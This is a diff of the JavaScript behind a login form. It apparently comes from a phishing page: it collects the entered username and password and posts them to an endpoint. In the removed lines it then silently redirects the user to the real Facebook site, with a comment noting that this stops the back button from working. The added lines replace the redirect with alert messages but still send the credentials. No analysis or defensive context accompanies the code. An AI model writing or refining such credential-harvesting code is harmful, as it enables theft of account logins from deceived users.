@@ -1,4 +1,4 @@
-document.getElementById('loginForm').addEventListener('submit', function (e) {
+document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();  // Prevent default form submission
 
     var username = document.getElementById('username').value;
@@ -15,17 +15,14 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
             'password': password
         })
     })
-        .then(response => {
-            if (response.ok) {
-                // If the request is successful, redirect to Facebook
-                console.log("Login successful! Redirecting...");
-                window.location.replace("https://www.facebook.com");  // Use replace to prevent users from using back button
-            } else {
-                console.log("Failed to send data");
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('An error occurred');
-        });
+    .then(response => {
+        if (response.ok) {
+            alert('Login successful!');
+        } else {
+            alert('Failed to send data');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
 });
